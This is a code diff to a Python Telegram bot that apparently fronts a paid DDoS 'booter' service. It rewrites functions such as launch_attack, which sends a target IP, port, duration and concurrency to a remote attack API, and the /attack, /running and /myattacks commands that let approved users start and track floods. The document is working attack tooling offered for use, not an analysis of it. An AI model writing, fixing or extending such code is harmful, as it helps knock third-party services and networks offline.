@@ -297,13 +297,13 @@ async def is_user_approved(user_id: int) -> bool:
     
     return True
 
-# API Functions - FIXED with correct endpoints (all require API key)
+# API Functions - FIXED for GET request with query parameters
 def check_api_health() -> Dict:
-    """Check API health status - REQUIRES API KEY"""
+    """Check API health status"""
     try:
         response = requests.get(
-            f"{API_URL}/api/v1/health",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
+            f"{API_URL}/api/attack",
+            params={"api_key": API_KEY},
             timeout=10
         )
         if response.status_code == 200:
@@ -315,11 +315,11 @@ def check_api_health() -> Dict:
         return {"status": "error", "error": str(e)}
 
 def check_running_attacks() -> Dict:
-    """Check running attacks for the user - REQUIRES API KEY"""
+    """Check running attacks"""
     try:
         response = requests.get(
-            f"{API_URL}/api/v1/active",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
+            f"{API_URL}/api/active",
+            params={"api_key": API_KEY},
             timeout=10
         )
         if response.status_code == 200:
@@ -331,11 +331,11 @@ def check_running_attacks() -> Dict:
         return {"success": False, "error": str(e)}
 
 def get_user_stats() -> Dict:
-    """Get user statistics - REQUIRES API KEY"""
+    """Get user statistics"""
     try:
         response = requests.get(
-            f"{API_URL}/api/v1/stats",  # Added /api/v1/ prefix
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
+            f"{API_URL}/api/stats",
+            params={"api_key": API_KEY},
             timeout=10
         )
         if response.status_code == 200:
@@ -347,15 +347,35 @@ def get_user_stats() -> Dict:
         return {"success": False, "error": str(e)}
 
 def launch_attack(ip: str, port: int, duration: int) -> Dict:
-    """Launch attack via API - REQUIRES API KEY"""
+    """Launch attack via API - GET request with query parameters"""
     try:
-        response = requests.post(
-            f"{API_URL}/api/v1/attack",  # Added /api/v1/ prefix
-            json={"ip": ip, "port": port, "duration": duration},
-            headers={"x-api-key": API_KEY, "Content-Type": "application/json"},
+        params = {
+            "api_key": API_KEY,
+            "target": ip,
+            "port": port,
+            "time": duration,
+            "concurrent": 1
+        }
+        
+        response = requests.get(
+            f"{API_URL}/api/attack",
+            params=params,
             timeout=15
         )
-        return response.json()
+        
+        # Try to parse JSON response
+        try:
+            result = response.json()
+        except:
+            result = {"error": "Invalid response from API", "success": False}
+        
+        # Check if attack was successful
+        if response.status_code == 200 and result.get("status") != "error":
+            result["success"] = True
+        else:
+            result["success"] = False
+            
+        return result
     except Exception as e:
         logger.error(f"Attack launch error: {e}")
         return {"error": str(e), "success": False}
@@ -449,12 +469,12 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     health = check_api_health()
     
-    if health.get("status") == "ok":
+    if health.get("status") != "error":
         message = (
-            f"✅ API Status: Healthy\n\n"
-            f"🕐 Timestamp: {health.get('timestamp', 'N/A')}\n"
-            f"📦 Version: {health.get('version', 'N/A')}\n\n"
-            f"🌐 API URL: {API_URL}"
+            f"✅ API Status: Connected\n\n"
+            f"🌐 API URL: {API_URL}\n"
+            f"🔑 API Key: {API_KEY[:10]}...\n\n"
+            f"Response: {health}"
         )
     else:
         message = (
@@ -482,16 +502,11 @@ async def running_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             message = f"🎯 Active Attacks ({len(active_attacks)})\n\n"
             for attack in active_attacks:
                 message += (
-                    f"🔹 Target: {attack['target']}:{attack['port']}\n"
-                    f"   ⏱️ Expires in: {attack['expiresIn']}s\n"
-                    f"   🆔 ID: {attack['attackId'][:8]}...\n\n"
+                    f"🔹 Target: {attack.get('target', 'Unknown')}:{attack.get('port', 'Unknown')}\n"
+                    f"   ⏱️ Expires in: {attack.get('expiresIn', 'N/A')}s\n"
                 )
         else:
             message = "✅ No active attacks running."
-        
-        message += f"\n📊 Limits:\n"
-        message += f"   • Current: {attacks.get('count', 0)} / {attacks.get('maxConcurrent', 0)}\n"
-        message += f"   • Remaining slots: {attacks.get('remainingSlots', 0)}"
     else:
         message = f"❌ Failed to fetch active attacks\n\nError: {attacks.get('error', 'Unknown error')}"
     
@@ -586,9 +601,6 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         successful_attacks = db.attacks.count_documents({"status": "success"})
         failed_attacks = db.attacks.count_documents({"status": "failed"})
         
-        # Get API stats
-        api_stats = get_user_stats()
-        
         message = (
             f"📊 Bot Statistics\n\n"
             f"👥 Users:\n"
@@ -603,11 +615,6 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🚫 Blocked Ports: {len(BLOCKED_PORTS)}\n"
             f"🕐 Bot Uptime: Running"
         )
-        
-        if api_stats.get("success"):
-            message += f"\n\n📡 API Stats:\n"
-            message += f"• Status: {api_stats.get('status', 'N/A')}\n"
-            message += f"• Days Remaining: {api_stats.get('daysRemaining', 'N/A')}"
         
         await update.message.reply_text(message)
         
@@ -751,22 +758,11 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     response = launch_attack(ip, port, duration)
     
     if response.get("success"):
-        attack_data = response.get("attack", {})
-        limits = response.get("limits", {})
-        account = response.get("account", {})
-        
         message = (
             f"✅ Attack Launched Successfully!\n\n"
             f"🎯 Target: {ip}:{port}\n"
-            f"⏱️ Duration: {duration} seconds\n"
-            f"🆔 Attack ID: {attack_data.get('id', 'N/A')[:8]}...\n"
-            f"⏰ Ends At: {attack_data.get('endsAt', 'N/A')}\n\n"
-            f"📊 Your Limits:\n"
-            f"• Active Attacks: {limits.get('currentActive', 0)} / {limits.get('maxConcurrent', 0)}\n"
-            f"• Remaining Slots: {limits.get('remainingSlots', 0)}\n\n"
-            f"📅 Account:\n"
-            f"• Status: {account.get('status', 'N/A')}\n"
-            f"• Days Remaining: {account.get('daysRemaining', 0)}"
+            f"⏱️ Duration: {duration} seconds\n\n"
+            f"📡 API Response: {response}"
         )
         
         # Log attack
@@ -775,12 +771,10 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(message)
     else:
         error_msg = response.get("error", "Unknown error")
-        details = response.get("message", "")
         
         message = (
             f"❌ Attack Failed!\n\n"
-            f"Error: {error_msg}\n"
-            f"Details: {details}\n\n"
+            f"Error: {error_msg}\n\n"
             f"Possible reasons:\n"
             f"• Invalid parameters\n"
             f"• Port is blocked\n"
@@ -809,13 +803,11 @@ async def myattacks_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             message = f"🎯 Your Active Attacks ({len(active_attacks)})\n\n"
             for attack in active_attacks:
                 message += (
-                    f"🔹 Target: {attack['target']}:{attack['port']}\n"
-                    f"   ⏱️ Expires in: {attack['expiresIn']}s\n\n"
+                    f"🔹 Target: {attack.get('target', 'Unknown')}:{attack.get('port', 'Unknown')}\n"
+                    f"   ⏱️ Expires in: {attack.get('expiresIn', 'N/A')}s\n\n"
                 )
         else:
             message = "✅ You have no active attacks running."
-        
-        message += f"\n📊 Usage: {attacks.get('count', 0)} / {attacks.get('maxConcurrent', 0)} concurrent attacks"
     else:
         message = f"❌ Failed to fetch attacks: {attacks.get('error', 'Unknown error')}"
     
